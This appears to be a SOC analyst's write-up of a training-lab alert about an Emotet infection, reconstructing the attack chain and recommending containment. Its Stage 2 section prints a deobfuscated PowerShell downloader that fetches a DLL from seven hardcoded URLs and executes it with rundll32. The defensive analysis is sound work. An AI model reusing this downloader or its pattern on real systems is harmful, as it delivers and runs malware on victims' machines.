# SOC109 - Emotet Malware Detected (Event ID:39)

## Executive Summary

On January 1, 2021, the Security Operations Center (SOC) detected the execution of the **Emotet** malware on the host **Maxim** (172.16.17.83). The investigation confirmed that the infection began when the user opened a malicious document (`MES 2020_12_31 S632974.doc`). The document's embedded macro launched a heavily obfuscated PowerShell "downloader" script. This script then successfully downloaded a secondary payload (a malicious DLL) from one of seven hardcoded C2 servers and executed it using `rundll32.exe`. The `Device Action: Allowed` and network logs confirming C2 communication indicate a full host compromise. This is a **True Positive** critical incident.

## Incident Details

The initial alert was triggered by the detection of a known Emotet payload:

<img width="1347" height="594" alt="image" src="https://github.com/user-attachments/assets/1f31903e-5faf-478b-a4f1-d230d9767e36" />

| | |
| :--- | :--- |
| **Date of Incident**| January 1, 2021 |
| **Source Host**| Maxim (172.16.17.83) |
| **Initial Vector**| `MES 2020_12_31 S632974.doc` |
| **File Hash (MD5)**| eee99e6d8ade9463dd206dfbad3485ea |
| **Malware Family**| Emotet (Trojan/Downloader) |
| **C2 IPs Contacted**| 152.170.79.100 (and others) |
| **Attack Type**| Phishing / Malware Dropper |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/39))* |

## Investigation and Analysis

### 1. Malware Profile: Emotet

**Emotet** is a notorious and highly dangerous malware family. It primarily spreads via phishing campaigns that use malicious document attachments. While it has its own information-stealing capabilities, its main function in modern campaigns is as a "loader" or "dropper." Once it infects a system, it establishes persistence and then sells or leases its access to other cybercriminal groups, who then deploy additional malware, most commonly leading to widespread ransomware attacks. An Emotet infection is considered an immediate and severe threat.

### 2. Deconstructing the Attack Chain

The investigation confirmed a clear, multi-stage infection process.

**Stage 1: The Malicious Document**
The attack began with a user opening the `.doc` file.
*   **Threat Intelligence:** The file hash was definitively identified as malicious by **48 vendors on VirusTotal** and received a **100/100 score on Hybrid Analysis**. This confirms the initial vector was a weaponized document.
    <img width="1706" height="819" alt="image" src="https://github.com/user-attachments/assets/3ccbf8fe-7006-489e-a2a7-0c599a7e32d8" />
    <img width="1554" height="753" alt="image" src="https://github.com/user-attachments/assets/79eba3be-3bbc-4e26-92a3-25714cc89694" />

**Stage 2: The PowerShell Downloader**
The document's macro executed a PowerShell script designed to download the main Emotet payload. The deobfuscated script reveals its functionality:
```powershell
# Deobfuscated Emotet Downloader Script

# Suppress errors and enable modern TLS for secure downloads.
$ErrorActionPreference = "SilentlyContinue"
[System.Net.ServicePointManager]::SecurityProtocol = 'Tls12'

# Prepare a hidden directory to store the payload.
$fullDirectoryPath = $HOME + "\F2s2k3m\Jww9w_b\T"
$dllPath = Join-Path -Path $fullDirectoryPath -ChildPath "L_0E.dll"
[System.IO.Directory]::CreateDirectory($fullDirectoryPath)

# Define a resilient list of C2 servers.
$urlList = @(
    "https://decpak.com/cgi-bin/gU/",
    "https://angelslimargas.com/AUDIO/3dwm/",
    "https://gadgetbay.com/letsdeal/gdFjfQ/",
    "https://csgcaro.com/content/Gb/",
    "https://aagzza.com/wp-content/KP/",
    "https://metador.com/ALFA_DATA/BtfM8Id/",
    "https://se4turketicaret.com/wp-admin/yOl/"
)

# Loop through URLs, download the payload, and execute it.
foreach ($url in $urlList) {
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $dllPath)

        # Verify download and execute the DLL using a legitimate Windows tool (LOLBin).
        if ((Get-Item $dllPath).Length -ge 39163) {
            rundll32.exe $dllPath, "Control_RunDLL"
            break
        }
    }
    catch {
        # Silently continue to the next URL on failure.
    }
}
```

**Stage 3: C2 Communication and Payload Execution**
*   **Execution Allowed:** The SIEM alert's `Device Action: Allowed` confirms that security controls did not block the initial document or the subsequent PowerShell execution.
*   **C2 Connection:** Network logs provide the "smoking gun," showing a successful GET request from the compromised host to one of the hardcoded C2 IPs (`152.170.79.100`), confirming the PowerShell script successfully downloaded the final payload.
    <img width="1027" height="320" alt="image" src="https://github.com/user-attachments/assets/bb70ee20-f48d-4624-b436-17ecddb59feb" />
*   **Execution via Rundll32:** The script's final action is to use `rundll32.exe` to execute the downloaded DLL. This is a classic "living-off-the-land" technique to run malicious code using a trusted Windows utility.

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Network Logs, VirusTotal, Hybrid Analysis
*   **Skills Demonstrated:** Malware Analysis (Emotet), Attack Chain Reconstruction, PowerShell Deobfuscation, LOLBin Technique Recognition (rundll32).

## Playbook Solution: Incident Classification

*   **Analyze Malware:** **Malicious.** The file is a confirmed Emotet dropper.
*   **Was the Attack Successful?** **Yes.** The payload was downloaded and executed.
*   **Do You Need Tier 2 Escalation?** **Yes.** A successful Emotet infection is a critical incident that often precedes a ransomware attack.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC109 was a **true positive** for a critical infection by the Emotet trojan. The host **Maxim** is fully compromised and is actively communicating with attacker infrastructure. This machine poses a severe and immediate threat to the rest of the network.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the host **Maxim** (172.16.17.83) from the network to sever the active C2 connection and prevent lateral movement.
2.  **CREDENTIALS - Disable and Reset:** Immediately disable the `Maxim` user account and reset their password. Emotet is known to steal credentials.
3.  **ESCALATE:** Immediately escalate this incident to the Tier 2/Incident Response (IR) team for a full-scale response.
4.  **INVESTIGATION:** The IR team's top priority is to hunt for lateral movement. They must:
    *   Analyze all network traffic for other hosts communicating with the known Emotet C2 IPs.
    *   Determine the initial access vector (the phishing email) and hunt for it in other mailboxes.
    *   Assume credentials have been dumped and look for signs of their reuse across the network.
5.  **BLOCK INDICATORS:** Immediately block all C2 domains/IPs identified in the PowerShell script at the network firewall. Add the file hash `eee99e6d8ade9463dd206dfbad3485ea` and the hash of the downloaded DLL to the EDR blocklist.
6.  **RECOVERY:** The compromised host must be wiped and re-imaged from a known-good source.












    
















